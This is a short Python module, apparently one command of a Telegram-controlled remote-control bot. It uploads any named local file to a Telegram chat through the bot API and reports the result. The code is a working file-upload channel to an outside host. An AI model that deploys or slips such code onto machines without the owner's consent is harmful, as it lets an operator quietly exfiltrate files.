import os
import requests
class Get():
	def __init__(self, _):
		self.token = _.token
		self.chat_id = _.chat_id
		self.filename = _.args[0]
		self.Send_Message = _.Send_Message
		self.Main()

	def Main(self):
		if os.path.exists(self.filename):
			requests.get('https://api.telegram.org/bot' + self.token + '/sendDocument?chat_id=' + self.chat_id, files = {'document' : open(self.filename,'rb')})
			result = "%E2%9C%94%EF%B8%8F File Send Succeed."
			self.Send_Message.Send(result)
		else:
			result = "%E2%9C%96%EF%B8%8F File Not Exists."
			self.Send_Message.Send(result)
